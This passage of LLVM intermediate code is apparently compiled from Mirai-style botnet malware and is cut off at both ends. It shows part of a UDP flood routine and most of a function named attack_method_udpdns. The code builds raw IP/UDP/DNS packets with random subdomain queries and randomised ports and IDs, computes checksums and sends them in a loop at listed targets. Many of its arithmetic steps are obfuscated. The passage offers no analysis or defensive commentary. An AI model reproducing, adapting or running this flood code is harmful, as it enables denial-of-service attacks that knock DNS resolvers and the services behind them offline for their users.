  %215 = load i32, i32* %9, align 4
  %216 = load i8, i8* %5, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp slt i32 %215, %217
  br i1 %218, label %219, label %349

; <label>:219:                                    ; preds = %214
  %220 = load i8**, i8*** %11, align 8
  %221 = load i32, i32* %9, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds i8*, i8** %220, i64 %222
  %224 = load i8*, i8** %223, align 8
  store i8* %224, i8** %23, align 8
  %225 = load i8*, i8** %23, align 8
  %226 = bitcast i8* %225 to %struct.iphdr*
  store %struct.iphdr* %226, %struct.iphdr** %24, align 8
  %227 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i64 1
  %229 = bitcast %struct.iphdr* %228 to %struct.udphdr*
  store %struct.udphdr* %229, %struct.udphdr** %25, align 8
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 2
  %235 = load i8, i8* %234, align 4
  %236 = zext i8 %235 to i32
  %237 = icmp slt i32 %236, 32
  br i1 %237, label %238, label %263

; <label>:238:                                    ; preds = %219
  %239 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %240 = load i32, i32* %9, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i64 %241
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i32 0, i32 1
  %244 = load i32, i32* %243, align 4
  %245 = call i32 @ntohl(i32 %244) #7
  %246 = call i32 @rand_next()
  %247 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 2
  %252 = load i8, i8* %251, align 4
  %253 = zext i8 %252 to i32
  %254 = lshr i32 %246, %253
  %255 = sub i32 0, %245
  %256 = sub i32 0, %254
  %257 = add i32 %255, %256
  %258 = sub i32 0, %257
  %259 = add i32 %245, %254
  %260 = call i32 @htonl(i32 %258) #7
  %261 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 9
  store i32 %260, i32* %262, align 4
  br label %263

; <label>:263:                                    ; preds = %238, %219
  %264 = load i16, i16* %13, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp eq i32 %265, 65535
  br i1 %266, label %267, label %272

; <label>:267:                                    ; preds = %263
  %268 = call i32 @rand_next()
  %269 = trunc i32 %268 to i16
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 3
  store i16 %269, i16* %271, align 4
  br label %272

; <label>:272:                                    ; preds = %267, %263
  %273 = load i16, i16* %16, align 2
  %274 = zext i16 %273 to i32
  %275 = icmp eq i32 %274, 65535
  br i1 %275, label %276, label %281

; <label>:276:                                    ; preds = %272
  %277 = call i32 @rand_next()
  %278 = trunc i32 %277 to i16
  %279 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %280 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %279, i32 0, i32 0
  store i16 %278, i16* %280, align 2
  br label %281

; <label>:281:                                    ; preds = %276, %272
  %282 = load i16, i16* %17, align 2
  %283 = zext i16 %282 to i32
  %284 = icmp eq i32 %283, 65535
  br i1 %284, label %285, label %290

; <label>:285:                                    ; preds = %281
  %286 = call i32 @rand_next()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i32 0, i32 1
  store i16 %287, i16* %289, align 2
  br label %290

; <label>:290:                                    ; preds = %285, %281
  %291 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 7
  store i16 0, i16* %292, align 2
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = bitcast %struct.iphdr* %293 to i16*
  %295 = call zeroext i16 @checksum_generic(i16* %294, i32 20)
  %296 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 7
  store i16 %295, i16* %297, align 2
  %298 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 3
  store i16 0, i16* %299, align 2
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %302 = bitcast %struct.udphdr* %301 to i8*
  %303 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %304 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %303, i32 0, i32 2
  %305 = load i16, i16* %304, align 2
  %306 = load i32, i32* %19, align 4
  %307 = sext i32 %306 to i64
  %308 = sub i64 12, 1322669308077837196
  %309 = add i64 %308, %307
  %310 = add i64 %309, 1322669308077837196
  %311 = add i64 12, %307
  %312 = trunc i64 %310 to i32
  %313 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %300, i8* %302, i16 zeroext %305, i32 %312)
  %314 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 3
  store i16 %313, i16* %315, align 2
  %316 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 1
  %318 = load i16, i16* %317, align 2
  %319 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %320 = load i32, i32* %9, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 0
  %324 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %323, i32 0, i32 1
  store i16 %318, i16* %324, align 2
  %325 = load i32, i32* %10, align 4
  %326 = load i8*, i8** %23, align 8
  %327 = load i32, i32* %19, align 4
  %328 = sext i32 %327 to i64
  %329 = sub i64 0, %328
  %330 = sub i64 32, %329
  %331 = add i64 32, %328
  %332 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %333 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %334 = load i32, i32* %9, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %333, i64 %335
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %336, i32 0, i32 0
  %338 = bitcast %struct.sockaddr_in* %337 to %struct.sockaddr*
  store %struct.sockaddr* %338, %struct.sockaddr** %332, align 8
  %339 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %340 = load %struct.sockaddr*, %struct.sockaddr** %339, align 8
  %341 = call i64 @sendto(i32 %325, i8* %326, i64 %330, i32 16384, %struct.sockaddr* %340, i32 16)
  br label %342

; <label>:342:                                    ; preds = %290
  %343 = load i32, i32* %9, align 4
  %344 = sub i32 0, %343
  %345 = sub i32 0, 1
  %346 = add i32 %344, %345
  %347 = sub i32 0, %346
  %348 = add nsw i32 %343, 1
  store i32 %347, i32* %9, align 4
  br label %214

; <label>:349:                                    ; preds = %214
  br label %213

; <label>:350:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %502

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %502

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %502

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %315, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %320

; <label>:101:                                    ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 600, i64 1) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = xor i8 15, -1
  %126 = xor i8 %124, %125
  %127 = and i8 %126, %124
  %128 = and i8 %124, 15
  %129 = and i8 %127, 64
  %130 = xor i8 %127, 64
  %131 = or i8 %129, %130
  %132 = or i8 %127, 64
  store i8 %131, i8* %123, align 4
  %133 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = xor i8 -16, -1
  %137 = xor i8 %135, %136
  %138 = and i8 %137, %135
  %139 = and i8 %135, -16
  %140 = xor i8 %138, -1
  %141 = xor i8 5, -1
  %142 = xor i8 -66, -1
  %143 = and i8 %140, -66
  %144 = and i8 %138, %142
  %145 = and i8 %141, -66
  %146 = and i8 5, %142
  %147 = or i8 %143, %144
  %148 = or i8 %145, %146
  %149 = xor i8 %147, %148
  %150 = or i8 %140, %141
  %151 = xor i8 %150, -1
  %152 = or i8 -66, %142
  %153 = and i8 %151, %152
  %154 = or i8 %149, %153
  %155 = or i8 %138, 5
  store i8 %154, i8* %134, align 4
  %156 = load i8, i8* %12, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 1
  store i8 %156, i8* %158, align 1
  %159 = load i8, i8* %19, align 1
  %160 = zext i8 %159 to i64
  %161 = add i64 41, 5723232458887481266
  %162 = add i64 %161, %160
  %163 = sub i64 %162, 5723232458887481266
  %164 = add i64 41, %160
  %165 = add i64 %163, 8439312723809290434
  %166 = add i64 %165, 2
  %167 = sub i64 %166, 8439312723809290434
  %168 = add i64 %163, 2
  %169 = load i32, i32* %21, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 %167, 375294110280452073
  %172 = add i64 %171, %170
  %173 = sub i64 %172, 375294110280452073
  %174 = add i64 %167, %170
  %175 = add i64 %173, 5096921761278848379
  %176 = add i64 %175, 4
  %177 = sub i64 %176, 5096921761278848379
  %178 = add i64 %173, 4
  %179 = trunc i64 %177 to i16
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 2
  store i16 %180, i16* %182, align 2
  %183 = load i16, i16* %13, align 2
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 3
  store i16 %184, i16* %186, align 4
  %187 = load i8, i8* %14, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 5
  store i8 %187, i8* %189, align 4
  %190 = load i8, i8* %15, align 1
  %191 = icmp ne i8 %190, 0
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %101
  %193 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 4
  store i16 %193, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %101
  %197 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 6
  store i8 17, i8* %198, align 1
  %199 = load i32, i32* @LOCAL_ADDR, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 8
  store i32 %199, i32* %201, align 4
  %202 = load i32, i32* %22, align 4
  %203 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 9
  store i32 %202, i32* %204, align 4
  %205 = load i16, i16* %16, align 2
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 0
  store i16 %206, i16* %208, align 2
  %209 = load i16, i16* %17, align 2
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 1
  store i16 %210, i16* %212, align 2
  %213 = load i8, i8* %19, align 1
  %214 = zext i8 %213 to i64
  %215 = sub i64 0, 21
  %216 = sub i64 0, %214
  %217 = add i64 %215, %216
  %218 = sub i64 0, %217
  %219 = add i64 21, %214
  %220 = sub i64 0, 2
  %221 = sub i64 %218, %220
  %222 = add i64 %218, 2
  %223 = load i32, i32* %21, align 4
  %224 = sext i32 %223 to i64
  %225 = sub i64 %221, -1793383998744258286
  %226 = add i64 %225, %224
  %227 = add i64 %226, -1793383998744258286
  %228 = add i64 %221, %224
  %229 = sub i64 %227, -7230045552516968399
  %230 = add i64 %229, 4
  %231 = add i64 %230, -7230045552516968399
  %232 = add i64 %227, 4
  %233 = trunc i64 %231 to i16
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 2
  store i16 %234, i16* %236, align 2
  %237 = load i16, i16* %18, align 2
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %240 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = call zeroext i16 @htons(i16 zeroext 256) #7
  %242 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %243 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %242, i32 0, i32 1
  store i16 %241, i16* %243, align 2
  %244 = call zeroext i16 @htons(i16 zeroext 1) #7
  %245 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %246 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %245, i32 0, i32 2
  store i16 %244, i16* %246, align 2
  %247 = load i8, i8* %19, align 1
  %248 = load i8*, i8** %29, align 8
  %249 = getelementptr inbounds i8, i8* %248, i32 1
  store i8* %249, i8** %29, align 8
  store i8 %247, i8* %248, align 1
  %250 = load i8, i8* %19, align 1
  %251 = zext i8 %250 to i32
  %252 = load i8*, i8** %29, align 8
  %253 = sext i32 %251 to i64
  %254 = getelementptr inbounds i8, i8* %252, i64 %253
  store i8* %254, i8** %29, align 8
  %255 = load i8*, i8** %29, align 8
  store i8* %255, i8** %30, align 8
  %256 = load i8*, i8** %29, align 8
  %257 = getelementptr inbounds i8, i8* %256, i64 1
  %258 = load i8*, i8** %20, align 8
  %259 = load i32, i32* %21, align 4
  %260 = add i32 %259, -1385284371
  %261 = add i32 %260, 1
  %262 = sub i32 %261, -1385284371
  %263 = add nsw i32 %259, 1
  call void @util_memcpy(i8* %257, i8* %258, i32 %262)
  store i32 0, i32* %23, align 4
  br label %264

; <label>:264:                                    ; preds = %294, %196
  %265 = load i32, i32* %23, align 4
  %266 = load i32, i32* %21, align 4
  %267 = icmp slt i32 %265, %266
  br i1 %267, label %268, label %300

; <label>:268:                                    ; preds = %264
  %269 = load i8*, i8** %20, align 8
  %270 = load i32, i32* %23, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds i8, i8* %269, i64 %271
  %273 = load i8, i8* %272, align 1
  %274 = sext i8 %273 to i32
  %275 = icmp eq i32 %274, 46
  br i1 %275, label %276, label %288

; <label>:276:                                    ; preds = %268
  %277 = load i8, i8* %24, align 1
  %278 = load i8*, i8** %30, align 8
  store i8 %277, i8* %278, align 1
  store i8 0, i8* %24, align 1
  %279 = load i8, i8* %25, align 1
  %280 = sub i8 0, 1
  %281 = sub i8 %279, %280
  %282 = add i8 %279, 1
  store i8 %281, i8* %25, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = load i32, i32* %23, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds i8, i8* %283, i64 %285
  %287 = getelementptr inbounds i8, i8* %286, i64 1
  store i8* %287, i8** %30, align 8
  br label %293

; <label>:288:                                    ; preds = %268
  %289 = load i8, i8* %24, align 1
  %290 = sub i8 0, 1
  %291 = sub i8 %289, %290
  %292 = add i8 %289, 1
  store i8 %291, i8* %24, align 1
  br label %293

; <label>:293:                                    ; preds = %288, %276
  br label %294

; <label>:294:                                    ; preds = %293
  %295 = load i32, i32* %23, align 4
  %296 = sub i32 %295, -995518266
  %297 = add i32 %296, 1
  %298 = add i32 %297, -995518266
  %299 = add nsw i32 %295, 1
  store i32 %298, i32* %23, align 4
  br label %264

; <label>:300:                                    ; preds = %264
  %301 = load i8, i8* %24, align 1
  %302 = load i8*, i8** %30, align 8
  store i8 %301, i8* %302, align 1
  %303 = load i8*, i8** %29, align 8
  %304 = load i32, i32* %21, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds i8, i8* %303, i64 %305
  %307 = getelementptr inbounds i8, i8* %306, i64 2
  %308 = bitcast i8* %307 to %struct.grehdr*
  store %struct.grehdr* %308, %struct.grehdr** %31, align 8
  %309 = call zeroext i16 @htons(i16 zeroext 1) #7
  %310 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %311 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %310, i32 0, i32 0
  store i16 %309, i16* %311, align 2
  %312 = call zeroext i16 @htons(i16 zeroext 1) #7
  %313 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %314 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %313, i32 0, i32 1
  store i16 %312, i16* %314, align 2
  br label %315

; <label>:315:                                    ; preds = %300
  %316 = load i32, i32* %9, align 4
  %317 = sub i32 0, 1
  %318 = sub i32 %316, %317
  %319 = add nsw i32 %316, 1
  store i32 %318, i32* %9, align 4
  br label %96

; <label>:320:                                    ; preds = %96
  br label %321

; <label>:321:                                    ; preds = %501, %320
  store i32 0, i32* %9, align 4
  br label %322

; <label>:322:                                    ; preds = %494, %321
  %323 = load i32, i32* %9, align 4
  %324 = load i8, i8* %5, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %323, %325
  br i1 %326, label %327, label %501

; <label>:327:                                    ; preds = %322
  %328 = load i8**, i8*** %11, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8*, i8** %328, i64 %330
  %332 = load i8*, i8** %331, align 8
  store i8* %332, i8** %32, align 8
  %333 = load i8*, i8** %32, align 8
  %334 = bitcast i8* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %33, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.udphdr*
  store %struct.udphdr* %337, %struct.udphdr** %34, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i64 1
  %340 = bitcast %struct.udphdr* %339 to %struct.dnshdr*
  store %struct.dnshdr* %340, %struct.dnshdr** %35, align 8
  %341 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %342 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %341, i64 1
  %343 = bitcast %struct.dnshdr* %342 to i8*
  %344 = getelementptr inbounds i8, i8* %343, i64 1
  store i8* %344, i8** %36, align 8
  %345 = load i16, i16* %13, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  br i1 %347, label %348, label %357

; <label>:348:                                    ; preds = %327
  %349 = call i32 @rand_next()
  %350 = xor i32 65535, -1
  %351 = xor i32 %349, %350
  %352 = and i32 %351, %349
  %353 = and i32 %349, 65535
  %354 = trunc i32 %352 to i16
  %355 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 3
  store i16 %354, i16* %356, align 4
  br label %357

; <label>:357:                                    ; preds = %348, %327
  %358 = load i16, i16* %16, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %370

; <label>:361:                                    ; preds = %357
  %362 = call i32 @rand_next()
  %363 = xor i32 65535, -1
  %364 = xor i32 %362, %363
  %365 = and i32 %364, %362
  %366 = and i32 %362, 65535
  %367 = trunc i32 %365 to i16
  %368 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %369 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %368, i32 0, i32 0
  store i16 %367, i16* %369, align 2
  br label %370

; <label>:370:                                    ; preds = %361, %357
  %371 = load i16, i16* %17, align 2
  %372 = zext i16 %371 to i32
  %373 = icmp eq i32 %372, 65535
  br i1 %373, label %374, label %383

; <label>:374:                                    ; preds = %370
  %375 = call i32 @rand_next()
  %376 = xor i32 65535, -1
  %377 = xor i32 %375, %376
  %378 = and i32 %377, %375
  %379 = and i32 %375, 65535
  %380 = trunc i32 %378 to i16
  %381 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %382 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %381, i32 0, i32 1
  store i16 %380, i16* %382, align 2
  br label %383

; <label>:383:                                    ; preds = %374, %370
  %384 = load i16, i16* %18, align 2
  %385 = zext i16 %384 to i32
  %386 = icmp eq i32 %385, 65535
  br i1 %386, label %387, label %400

; <label>:387:                                    ; preds = %383
  %388 = call i32 @rand_next()
  %389 = xor i32 %388, -1
  %390 = xor i32 65535, -1
  %391 = xor i32 18511561, -1
  %392 = or i32 %389, %390
  %393 = or i32 18511561, %391
  %394 = xor i32 %392, -1
  %395 = and i32 %394, %393
  %396 = and i32 %388, 65535
  %397 = trunc i32 %395 to i16
  %398 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %399 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %398, i32 0, i32 0
  store i16 %397, i16* %399, align 2
  br label %400

; <label>:400:                                    ; preds = %387, %383
  %401 = load i8*, i8** %36, align 8
  %402 = load i8, i8* %19, align 1
  %403 = zext i8 %402 to i32
  call void @rand_alpha_str(i8* %401, i32 %403)
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 7
  store i16 0, i16* %405, align 2
